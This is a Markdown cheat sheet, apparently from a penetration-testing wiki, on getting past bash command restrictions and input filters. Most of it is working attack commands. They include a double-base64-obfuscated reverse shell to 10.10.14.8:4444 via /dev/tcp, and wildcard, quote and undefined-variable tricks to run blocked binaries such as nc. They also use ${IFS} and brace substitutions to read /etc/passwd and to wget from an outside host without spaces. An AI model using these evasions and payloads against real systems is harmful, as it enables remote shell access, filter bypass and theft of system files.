# Bypass Bash Restrictions

## Reverse Shell

```bash
# Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
#echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
```

## Bypass Paths and forbidden commands

```bash
# Question mark binary substitution
/usr/bin/p?ng # /usr/bin/ping
nma? -p 80 localhost # /usr/bin/nmap -p 80 localhost

# Wildcard(*) binary substitution
/usr/bin/who*mi # /usr/bin/whoami

# Wildcard + local directory arguments
touch -- -la # -- stops processing options after the --
ls *

# [chars]
/usr/bin/n[c] # /usr/bin/nc

# Quotes / Concatenation
'p'i'n'g # ping
"w"h"o"a"m"i # whoami
\u\n\a\m\e \-\a # uname -a
ech''o test # echo test
ech""o test # echo test
bas''e64 # base64

# Uninitialized variables: A uninitialized variable equals to null (nothing)
cat$u /etc$u/passwd$u # Use the uninitialized variable without {} before any symbol
p${u}i${u}n${u}g # Equals to ping, use {} to put the uninitialized variables between valid characters

# Fake commands
p$(u)i$(u)n$(u)g # Equals to ping but 3 errors trying to execute "u" are shown
w`u`h`u`o`u`a`u`m`u`i # Equals to whoami but 5 errors trying to execute "u" are shown

# Concatenation of strings using history
!-1 # This will be substitute by the last command executed, and !-2 by the penultimate command
mi # This will throw an error
whoa # This will throw an error
!-1!-2 # This will execute whoami
```

## Bypass forbidden spaces

```bash
# {form}
{cat,lol.txt} # cat lol.txt
{echo,test} # echo test

## IFS - Internal field separator, change " " for any other character ("]" in this case)
cat${IFS}/etc/passwd # cat /etc/passwd
cat$IFS/etc/passwd # cat /etc/passwd

# Put the command line in a variable and then execute it
IFS=];b=wget]10.10.14.21:53/lol]-P]/tmp;$b
IFS=];b=cat]/etc/passwd;$b # Using 2 ";"
IFS=,;`cat<<<cat,/etc/passwd` # Using cat twice
#  Other way, just change each space for ${IFS}
echo${IFS}test

# Using hex format
X=$'cat\x20/etc/passwd'&&$X

# New lines
p\
i\
n\
g # This 4 lines will equal to ping

## Undefined variables and !
$u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
uname!-1\-a # This equals to uname -a
```

## Bypass IPs

```bash
# Decimal IPs
127.0.0.1 == 2130706433
```

## References & More

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection\#exploits" caption="" %}

{% embed url="https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet" caption="" %}

{% embed url="https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0" caption="" %}

{% embed url="https://www.secjuice.com/web-application-firewall-waf-evasion/" caption="" %}

